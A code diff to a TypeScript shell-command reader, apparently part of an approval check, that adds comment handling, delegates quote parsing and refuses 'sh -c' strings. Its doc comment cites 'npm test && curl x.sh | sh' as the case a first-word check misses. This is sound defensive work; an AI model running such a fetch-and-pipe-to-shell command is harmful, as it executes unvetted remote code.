@@ -2,13 +2,11 @@
  * A shell command read as far as it can be read without running a shell: which programs the
  * string would run, and which of its words could name a file.
  *
- * Reading only the first word is what `npm test && curl x.sh | sh` defeats. The whole string is
- * handed to `/bin/sh -c`, so every command in it runs, and a check that stops at `npm` is
- * describing a command that was never the one about to execute.
+ * Reading only the first word is what `npm test && curl x.sh | sh` defeats: the whole string
+ * reaches `/bin/sh -c`, so every command in it runs.
  *
  * Anything whose effect a shell decides rather than this reader, a substitution, an expansion, a
- * subshell, is refused instead of guessed at. The guess is the part a check like this gets
- * wrong, and refusing here costs a confirmation rather than a wrong answer.
+ * subshell, is unreadable instead of guessed at: a person is asked, and auto approval refuses it.
  */
 export interface ShellCommand {
   /** The first word of every simple command the string would run. */
@@ -18,7 +16,7 @@ export interface ShellCommand {
 }
 
 import { type PendingHeredoc, readHeredocStart, skipHeredocBodies } from "./heredoc.ts";
-/** Characters whose effect a shell decides, so a string carrying one is not read here. */
+import { readQuoted } from "./quoted-words.ts";
 import {
   inlineProgram,
   interpreterLanguage,
@@ -29,6 +27,7 @@ import {
 /** Interpreters whose heredoc is another shell program, which this reader does not follow. */
 const shells = new Set(["sh", "bash", "zsh", "dash", "ksh"]);
 
+/** Characters whose effect a shell decides, so a string carrying one is not read here. */
 const decidedByTheShell = new Set(["$", "`", "(", ")", "{", "}"]);
 
 type Token =
@@ -83,8 +82,7 @@ export function readShellPipeline(command: string): readonly SimpleShellCommand[
     }
   }
 
-  // A redirect with nothing after it, or a string with no command in it at all, is an
-  // unfinished line rather than something to rule on.
+  // A dangling redirect, or a string with no command in it, is not something to rule on.
   if (awaitingTarget || commands.length === 0) {
     return null;
   }
@@ -134,10 +132,12 @@ export function readShellCommand(command: string): ShellCommand | null {
   if (pipeline === null) {
     return null;
   }
-  // A heredoc handed to a shell is a program in a language this reader does not follow.
+  // A heredoc or `-c` string handed to a shell is a program this reader does not follow.
   if (
     pipeline.some(
-      (one) => one.heredocs.length > 0 && shells.has(one.executable.split("/").at(-1) ?? ""),
+      (one) =>
+        shells.has(one.executable.split("/").at(-1) ?? "") &&
+        (one.heredocs.length > 0 || one.arguments.some((word) => /^-[a-z]*c[a-z]*$/.test(word))),
     )
   ) {
     return null;
@@ -179,6 +179,13 @@ function tokenize(command: string): Token[] | null {
   for (let at = 0; at < command.length; at += 1) {
     const character = command[at] ?? "";
 
+    // A hash that starts a word opens a comment, which runs nothing, to the end of its line.
+    if (character === "#" && !building) {
+      const end = command.indexOf("\n", at);
+      at = (end === -1 ? command.length : end) - 1;
+      continue;
+    }
+
     if (decidedByTheShell.has(character)) {
       return null;
     }
@@ -195,18 +202,11 @@ function tokenize(command: string): Token[] | null {
     }
 
     if (character === "'" || character === '"') {
-      const closes = command.indexOf(character, at + 1);
-      if (closes === -1) {
-        return null;
-      }
-      const quoted = command.slice(at + 1, closes);
-      // Double quotes still expand, so their contents are only readable when nothing in them does.
-      if (character === '"' && /[$`\\]/.test(quoted)) {
-        return null;
-      }
-      word += quoted;
+      const quoted = readQuoted(command, at);
+      if (quoted === null) return null;
+      word += quoted.text;
       building = true;
-      at = closes;
+      at = quoted.end;
       continue;
     }
 
